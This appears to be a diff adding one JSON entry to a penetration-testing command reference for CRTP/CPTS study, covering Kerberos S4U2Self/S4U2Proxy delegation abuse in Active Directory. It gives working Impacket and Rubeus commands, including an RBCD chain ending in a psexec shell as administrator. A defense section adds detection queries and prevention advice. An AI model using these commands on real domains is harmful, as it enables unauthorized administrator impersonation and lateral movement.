@@ -1,0 +1,101 @@
+{
+  "id": "ad-s4u2self-abuse",
+  "name": "S4U2Self / S4U2Proxy - Kerberos Delegation Exploitation",
+  "command": "python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> <domain>/<machine_account>$:<pass>",
+  "description": "S4U2Self (Service-for-User-to-Self) allows a service to obtain a service ticket to itself on behalf of any user. S4U2Proxy then forwards that ticket to another service. Together they enable impersonation through constrained delegation and RBCD. This is the core mechanism behind RBCD attacks, constrained delegation abuse, and several ADCS attack chains.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Delegation Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP delegation module; Impacket getST.py",
+  "tags": [
+    "s4u2self",
+    "s4u2proxy",
+    "delegation",
+    "impersonation",
+    "rbcd",
+    "constrained-delegation",
+    "kerberos"
+  ],
+  "mitre": [
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE MECHANISM ===\nS4U2Self: \"I am service X, give me a ticket to myself for user Y\"\nS4U2Proxy: \"I have a ticket for user Y to me, give me a ticket for Y to service Z\"\n\nThis only works when:\n1. The requesting account is allowed to delegate to the target service\n2. The impersonated user is not in Protected Users or marked sensitive\n\n=== RBCD CHAIN (most common) ===\n  # 1. Set up RBCD\n  python3 rbcd.py -delegate-from FAKE01$ -delegate-to <target>$ -action write <domain>/<user>:<pass>\n  # 2. S4U2Self+S4U2Proxy\n  python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> <domain>/FAKE01$:Password123\n  # 3. Use the ticket\n  export KRB5CCNAME=administrator.ccache\n  python3 psexec.py -k -no-pass <domain>/administrator@<target>.<domain>\n\n=== CONSTRAINED DELEGATION ===\n  # If a service has constrained delegation to another service:\n  python3 getST.py -spn <allowed_spn> -impersonate administrator <domain>/<service_account>:<pass>\n  # Alternative SPN (-altservice) works because the SPN in the ticket is not validated:\n  python3 getST.py -spn <allowed_spn> -impersonate administrator -altservice cifs/<target> <domain>/<service_account>:<pass>\n\n=== RUBEUS (WINDOWS) ===\n  Rubeus.exe s4u /user:<machine>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt\n  # With alternative service:\n  Rubeus.exe s4u /user:<machine>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:time/<target> /altservice:cifs/<target> /ptt",
+  "examples": [
+    {
+      "label": "S4U impersonation via RBCD",
+      "command": "python3 getST.py -spn cifs/target.corp.local -impersonate administrator -dc-ip 192.168.1.10 corp.local/FAKE01$:Password123"
+    },
+    {
+      "label": "Constrained delegation with alt service",
+      "command": "python3 getST.py -spn time/target.corp.local -impersonate administrator -altservice cifs/target.corp.local corp.local/svc_sql:Password123"
+    },
+    {
+      "label": "Rubeus S4U with ticket injection",
+      "command": "Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket getST.py",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "MITRE T1550.003 - Use Alternate Authentication Material",
+      "url": "https://attack.mitre.org/techniques/T1550/003/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-addcomputer",
+      "note": "Create the machine account needed for RBCD before S4U.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-impacket-rbcd",
+      "note": "Set up RBCD delegation before using S4U to impersonate.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "S4U2Self is a legitimate Kerberos protocol extension that allows services to request tickets on behalf of users. The DC trusts the delegation configuration and issues tickets for the impersonated user.",
+    "prerequisites": "Control of an account with delegation rights (constrained delegation or RBCD); target user not in Protected Users.",
+    "impact": "Full impersonation of any domain user (including admin) to the delegated service.",
+    "detection": "[MITRE T1550.003] Event 4769 (TGS request) with delegation flags; S4U2Self/S4U2Proxy ticket requests from unusual sources.",
+    "artifacts": "Event 4769 with TransitedServices field; Kerberos tickets with delegation flags; unusual service-to-service authentication.",
+    "splunk_spl": "index=windows EventCode=4769 TransitedServices!=\"\"\n| table _time, TargetUserName, ServiceName, IpAddress, TransitedServices",
+    "elastic_kql": "event.code:\"4769\" AND winlog.event_data.TransitedServices:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where TransitedServices != \"\"\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TransitedServices",
+    "sigma_rules": "win_security_s4u_delegation_abuse",
+    "prevention": "Add sensitive accounts to Protected Users; set \"Account is sensitive and cannot be delegated\"; use RBCD instead of unconstrained delegation; monitor delegation configuration changes.",
+    "sources": [
+      "CRTP delegation module",
+      "https://attack.mitre.org/techniques/T1550/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "S4U2Self/S4U2Proxy delegation exploitation",
+        "logic": "SecurityEvent\n| where EventID == 4769\n| where TransitedServices != \"\"\n| where TargetUserName has \"administrator\" or TargetUserName has \"admin\"\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TransitedServices",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4769"
+        ],
+        "attack": [
+          "T1550.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate constrained delegation (e.g., IIS to SQL); front-end/back-end service chains",
+        "tuning": "Baseline normal delegation patterns; alert on admin impersonation through delegation"
+      }
+    ]
+  }
+}
